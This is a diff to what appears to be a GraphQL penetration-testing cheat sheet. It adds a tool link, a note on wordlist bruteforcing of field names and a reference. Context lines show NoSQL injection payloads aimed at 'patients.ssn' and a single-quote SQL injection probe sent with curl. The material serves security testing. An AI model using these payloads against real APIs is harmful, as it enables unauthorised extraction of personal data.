@@ -33,6 +33,7 @@
 * [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Scripting engine to interact with a graphql endpoint for pentesting purposes
 * [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL Security Research Material
 * [doyensec/inql](https://github.com/doyensec/inql) - A Burp Extension for GraphQL Security Testing
+* [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - parses GraphQL introspection schema and generates possible queries
 * [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Lists the different ways of reaching a given type in a GraphQL schema
 * [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - An extensive IDE for exploring GraphQL API's
 * [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Obtain GraphQL API schema despite disabled introspection
@@ -205,6 +206,9 @@ When you use an unknown keyword, the GraphQL backend will respond with a suggest
 }
 ```
 
+You can also try to bruteforce known keywords, field and type names using wordlists such as [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) when the schema of a GraphQL API is not accessible.
+
+
 
 ### Enumerate the types' definition 
 
@@ -271,7 +275,7 @@ example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
 
 :warning: Don’t forget to escape the " inside the **options**.
 
-```json
+```js
 {doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
 ```
 
@@ -347,7 +351,7 @@ mutation {
 
 Use `$regex`, `$ne` from []() inside a `search` parameter.
 
-```json
+```js
 {
   doctors(
     options: "{\"limit\": 1, \"patients.ssn\" :1}", 
@@ -363,7 +367,7 @@ Use `$regex`, `$ne` from []() inside a `search` parameter.
 
 Send a single quote `'` inside a graphql parameter to trigger the SQL injection
 
-```powershell
+```js
 { 
     bacon(id: "1'") { 
         id, 
@@ -399,3 +403,4 @@ curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%
 * [GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019](https://lab.wallarm.com/graphql-batching-attack/)
 * [GraphQL for Pentesters presentation by ACCEIS - 01/12/2022](https://acceis.github.io/prez-graphql/) - [source](https://github.com/Acceis/prez-graphql)
 * [Exploiting GraphQL - Aug 29, 2021 - AssetNote - Shubham Shah](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
+* [Building a free open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - Aug 17, 2023](https://escape.tech/blog/graphql-security-wordlist/)
